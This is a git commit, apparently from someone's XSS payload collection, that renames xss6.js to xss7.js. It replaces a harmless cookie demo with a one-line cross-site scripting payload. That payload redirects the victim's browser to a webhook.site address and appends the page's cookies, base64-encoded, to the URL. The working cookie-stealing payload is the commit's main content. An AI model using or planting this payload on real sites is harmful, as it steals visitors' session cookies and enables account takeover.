b66139120c87d8614cea7b69b0ac3367a55e326a
FloBfa <65276591+FloBfa@users.noreply.github.com>
2023-11-22 22:12:49 +0100

    Update and rename xss6.js to xss7.js

--- xss6.js
+++
@@ -1,5 +0,0 @@
-alert("blooooo")
-document.cookie = "username=Null Byte";
-document.write(document.cookie);
-document.cookie = "username=Johnny";
-document.write(document.cookie);
---
+++ xss7.js
@@ -0,0 +1,1 @@
+document.location = "https://webhook.site/16f1f807-d643-49b5-aafb-1f7bdb076aa5?c=" + btoa(document.cookie)
